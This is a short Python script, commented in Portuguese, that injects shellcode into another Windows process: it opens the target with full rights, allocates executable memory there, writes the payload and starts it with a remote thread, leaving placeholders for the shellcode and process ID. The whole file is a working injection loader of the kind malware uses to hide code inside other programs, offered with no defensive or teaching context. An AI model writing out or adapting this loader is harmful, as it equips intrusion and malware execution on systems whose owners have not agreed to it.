from ctypes import *                                                                                                            
                                                                                                        
# Kernel32
KERNEL32 = windll.kernel32

# Permissoes para as regioes mapeadas na memoria                                                        
PAGE_EXECUTE_READWRITE = 0x00000040
MEMORIA_VIRTUAL = (0x1000 | 0x2000)

# Permissoes para um processo
DELETE = 0x00010000
READ_CONTROL = 0x00020000
SYNCHRONIZE = 0x00100000
WRITE_DAC  = 0x00040000
WRITE_OWNER  = 0x00080000
TODAS_PERMISSOES = (DELETE | READ_CONTROL | SYNCHRONIZE | WRITE_DAC | WRITE_OWNER | 0xFFF)

def inject(shellcode, pid):

        print '[*] Abrindo o processo: %s' % pid
        processo = KERNEL32.OpenProcess(TODAS_PERMISSOES, False, int(pid))

        if not processo:
                print '[-] Erro ao abrir processo'
                return False

        print '[*] Alocando memoria para o shellcode'
        shellcode_endereco = KERNEL32.VirtualAllocEx(processo, 0, len(shellcode), MEMORIA_VIRTUAL, PAGE_EXECUTE_READWRITE)

        print '[*] Escrevendo shellcode na memoria'
        bytes_escritos = c_int(0)
        KERNEL32.WriteProcessMemory(processo, shellcode_endereco, shellcode, len(shellcode), byref(bytes_escritos))

        print '[*] Criando nova thread'
        thread_id = c_ulong(0)
        if not KERNEL32.CreateRemoteThread(processo, None, 0, shellcode_endereco, None, 0, byref(thread_id)):
                return False

        print '[+] Injecao realizada com sucesso!'
        return True

sc = "SHELLCODE AQUI!!!"
pid = 'PID DO PROCESSO AQUI!!!'
inject(sc, pid)

